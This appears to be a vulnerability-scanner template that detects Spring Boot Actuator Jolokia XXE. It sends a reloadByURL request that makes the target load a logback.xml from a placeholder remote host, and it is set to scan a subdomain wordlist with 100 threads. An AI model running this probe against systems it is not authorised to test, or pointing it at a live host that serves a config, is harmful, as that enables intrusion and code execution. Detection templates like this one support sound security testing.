id: springboot-actuators-jolokia-xxe 1
info:
  author: dwisiswant0,ipanda
  description: A vulnerability in Spring Boot Actuators's 'jolokia' endpoint allows
    remote attackers to preform an XML External Entities attack, include content stored
    on a remote server as if it was its own - this has the potential to allow the
    execution of arbitrary code and/or disclosure of sensitive information from the
    target machine.
  name: Spring Boot Actuators (Jolokia) XXE
  reference: '- https://www.veracode.com/blog/research/exploiting-spring-boot-actuators

    - https://github.com/mpgn/Spring-Boot-Actuator-Exploit

    '
  severity: high
  tags: springboot,jolokia,xxe
requests:
- attack: sniper
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - http:\/\/nonexistent:31337\/logback.xml
    - reloadByURL
    - JoranException
  - part: header
    type: word
    words:
    - X-Application-Context
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml
    HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/87.0.4280.88 Safari/537.36

    '
  threads: 100
